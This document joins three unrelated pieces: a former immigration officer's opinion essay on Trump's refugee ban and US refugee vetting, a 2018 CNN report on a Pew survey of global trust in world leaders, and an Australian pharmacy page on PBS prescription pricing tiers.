Whoever wrote this order is evidently not aware that these screenings, procedures and questions already exist.
During nearly four years as an immigration officer, I conducted in-person interviews with hundreds of refugees of 20 different nationalities in 10 countries. I saw countless refugees break down crying in my interview room because of the length and severity of the vetting process. From that experience and numerous security briefings, it’s clear that the authors of Trump’s order are unfamiliar with the U.S. immigration system, U.S. laws, international law and the security threats facing our nation. I can’t speak for all refugee and asylum officers, but I can say that those who have been working in immigration for years from opposite ends of the political spectrum are appalled by these new policies.
Several years ago, Berivan left her home in the relative safety of northeast Syria to go to the capital, Damascus, to help people organize peacefully. She ended up being persecuted by the Syrian government and armed extremist groups, and was trapped in an area under siege by the regime. She paid the price for her pursuit of freedom in ways too horrifying to mention.
She finally escaped and fled with her husband to Turkey, where she put her English and Arabic fluency to work with humanitarian organizations. When I met her last year, she mentioned that she had applied for resettlement to the United States. Several months later, she called me after her resettlement interview, depressed and agitated. For someone like Berivan, who was severely traumatized by the war, the probing interview had been brutal. She was called back for another interview, but she couldn’t take any more and did not believe that the United States would resettle both her and her husband. So she risked her life and got on a rickety boat to reach Europe. They are now rebuilding their lives in Germany. I suppose she made the right choice, but the United States lost a hero.
I was saddened by this story, but I was not surprised. The process for any citizen of a Middle Eastern or majority-Muslim country to get into the United States is tortuous and has become more so over the past 15 years, with additional screenings, interviews and other background checks. When I started, DHS officers interviewed four Syrian or Iraqi refugee cases per day; they now interview only two per day to accommodate the range of questions and safeguards that have been added to the process. While the average wait time for refugee resettlement is 18 to 24 months, Iraqis and Syrians typically wait several years.
The process starts with the United Nations’ refugee agency, the U.N. High Commissioner for Refugees (UNHCR). It conducts interviews and screenings, including home country reference checks and biological screenings such as iris scans. Then the UNHCR decides if an applicant is suitable for resettlement and which country he or she can apply to. (Out of more than 65 million refugees worldwide, about 0.1 percent were resettled to the United States last year.) Another international organization assists with resettlement processing by collecting documents and conducting more interviews with the families, looking carefully for discrepancies.
By the time Homeland Security steps in to conduct an interview, the officer has a stack of biographical information on the refugee. Ironically, Iraqis, Syrians and Iranians, who are all now barred from entering the United States, are far and away the most well-documented refugees we interview. I typically had to review a raft of high school degrees, baptismal certificates, marriage and birth certificates, honors and awards, photos with U.S. service personnel, recommendations from American military members, and conscription booklets or cards, which every man in those countries has to carry. Since the United States has been in Iraq for more than 10 years, the government has a plethora of information on Iraqis — in many cases, terrorists, criminals and persecutors are recognizable and denied. In one instance, because we had this information, I knew that a man had worked with Saddam Hussein’s intelligence agency for years and potentially tortured people, and, because of checks already in place, his application was rejected.
The Homeland Security officer then conducts a detailed interview. Every word is recorded so it can be matched up with other documentation and past interviews. Some refugees are so fearful of forgetting some detail of their lives that they bring notes to the interviews to remember everything exactly. Applicants have been reprimanded or denied for having those notes because of concerns that they are fixing their scripts. Every detail of their cases is pored over and exhaustively analyzed. In one instance, while reviewing a case, I came across a report of a refugee who had handed someone a piece of fruit at a checkpoint. The incident was thoroughly investigated to determine whether the person had provided material support to a potential terrorist organization.
Next, our government performs its own intensive screening. The refugees’ information and fingerprints (also taken by Homeland Security officers) are run through the databases of nine law enforcement, intelligence and security agencies and matched against criminal databases and biographical information such as past visa applications. Behind the scenes, officers and supervisors of varying political stripes debate and discuss each case endlessly. At U.S. Citizenship and Immigration Services headquarters, officers conduct more research, reconciling multiple interview notes, country conditions and background checks. They are trained to spot “red flags” or issues that might make someone inadmissible. If a national security threat emerges, certain nationalities are placed under tighter scrutiny.
If you’re bored by now just reading about the process, imagine refugees waiting years in a camp, freezing in tents and unable to put their children in school. Some continue to receive threats — and some applicants are killed while waiting. That fate could await those whose visas were revoked after Trump’s order and those still navigating the approval process.
Supporters of Trump’s order argue that this ban is temporary, but they do not understand the consequences of this stoppage for refugees. Before the war in Syria began, I met Laith, an Iraqi refugee, who had fled to Syria after members of a militia group attacked him and his family. But he still was not safe. Someone claiming to be with the Syrian government threatened him. He was forced to move from house to house for months to escape death until the United States resettled him. If the Trump ban had been in place, even temporarily, Laith might not have survived much longer.
Aside from the imminent danger many applicants face, the stop on refugee resettlement presents another issue: These security checks expire, which means that, if delayed, applicants will have to begin the process again. That will, in turn, slow the process for new applicants, creating a huge backlog. About 60 percent of the 11,000 Syrians resettled last year in the States were children. The forthcoming delays could consume entire childhoods. Those who had already been approved probably sold all their belongings in preparation to move to the United States.
Even before this extreme vetting process was established, refugee resettlement did not represent a profound threat to Americans’ safety. According to a report recently released by the Cato Institute, out of millions of refugees resettled to the United States over several decades, just 20 have committed or attempted attacks. They killed three people, all in the 1970s, before the creation of the modern screening system. The annual chance of being killed in a terrorist attack committed by a refugee is 1 in 3.6 billion.
So not only does the executive order provide no logical benefit to national security, such policies feed into the extremist narrative that America hates all Muslims — thereby hurting national security, as Michael Hayden, former CIA director during the George W. Bush administration, and other government officials have argued.
All this information is available to Trump. The only explanation for his order is that the president is using refugees to appeal to his base at the expense of national security.

Trump trusted less than Putin and Xi, says new global study
Posted: 6:50 AM, Oct 02, 2018
Updated: 2018-10-02 10:50:21Z
By: CNN
U.S. President Donald Trump inspires less trust around the world than many other international leaders, including autocrats like Russia's Vladimir Putin and China's Xi Jinping, according to a new global survey.
The poll of people in 25 countries found that just 27 percent of all respondents, on average, have confidence in Trump to "do the right thing in world affairs."
The most trusted international leader, by contrast, was German Chancellor Angela Merkel, who claimed the confidence of 52 percent of all respondents. Xi Jinping scored 34 percent and Vladimir Putin, 30 percent.
The survey was conducted among 26,112 respondents in 25 countries from May 20 to August 12 by the Pew Research Center, a nonpartisan, Washington-based think tank.
The research found overall ratings for the U.S. role in international affairs are much lower than during Barack Obama's presidency.
"Large majorities say the U.S. doesn't consider the interests of countries like theirs when making foreign policy decisions," said analysts at Pew.
"Many believe the U.S. is doing less to help solve major global challenges than it once did. And there are signs that American soft power is waning as well: While the U.S. maintains its reputation for respecting individual liberty, fewer believe this than a decade ago," the Pew analysts said.
Since his election in November 2016, Trump has started trade wars, rejected major international agreements and questioned old alliances. At the United Nations last month, he declared that his administration rejects "the ideology of globalism" in favor of "the doctrine of patriotism."
Unsurprisingly, the distance between the U.S. and its traditional allies seems to be widening. Many of those questioned in U.S.-allied and partner countries were particularly critical of Trump.
In Germany, only 10 percent of people said they had confidence in the U.S. President. That figured dropped to 9 percent in France and 7 percent in Spain.
Closer to home, just 6 percent of Mexican respondents expressed confidence in Trump's leadership while 25 percent of Canadians surveyed rated Trump positively.
One exception to the pattern was Israel, where Trump's positivity ranking stood at 69 percent. Late last year, Trump recognized Jerusalem as the capital of Israel and later moved the U.S. Embassy there from Tel Aviv.
Despite the negative views of Trump's leadership, 63 percent of global respondents said they continued to support a world order in which the U.S. was the leading power, as opposed to China.
The survey found that views of China varied distinctly from country to country.
Among the citizens in the 25 countries surveyed, which did not include China, 45 percent of respondents had a favorable view of China, while 43 percent took an unfavorable view.
Russia's image of Trump on the decline
The biggest drop in the U.S. ratings came from Russia, where only 26 percent of those polled held a favorable view of the United States -- a drop of 15 points from 2017.
A majority of Russians polled said relations between Moscow and Washington worsened in the past year. The share of the public with a positive view of Trump has dropped from 53 to 19 percent.
That drop comes amid the ongoing investigation into Russian interference in the 2016 presidential election.
The U.S. Justice Department announced in July that it would charge 12 Russian nationals with engaging in a sophisticated campaign to influence the 2016 presidential election, including the release of emails designed to damage Democratic presidential candidate Hillary Clinton.

Depending on your eligibility for entitlement, you may receive different subsidy levels from the Australian Government for your prescription medications. There are 4 different types of prescription pricing:
1. PBS (General Patients)
PBS pricing is for general patients. General patients have a Medicare card but do not have a Concession card.
2. Private (Non-PBS Prescription)
These are medications which do not qualify for any subsidy from the Government; hence you will need to pay the full price for the medicine.
3. Concession
Concessional pricing is heavily subsidised by the Australian Government. To be eligible for concession pricing you will need to have one of the following concession cards:
Pensioner Concession Card, Commonwealth Seniors Health Card, Health Care Card, DVA White, Gold, or Orange Card – also known as ‘Repat’ card, Blue Safety Net Concession Card.
4. Entitlement (Green Safety Net Card)
Concession card holders whose yearly spend on PBS medication has reached the Safety Net threshold* are entitled to a Green Safety Net (SN) card. This qualifies you to obtain your PBS prescriptions for free for the rest of the calendar year - unless you choose a more expensive brand of medicine, in that case you may need to pay more. You may avoid paying any extra costs by selecting the generic brand. (Learn more)
*$384 (60 PBS Scripts at $6.40 each or 71 PBS Scripts at $5.40) for 2018
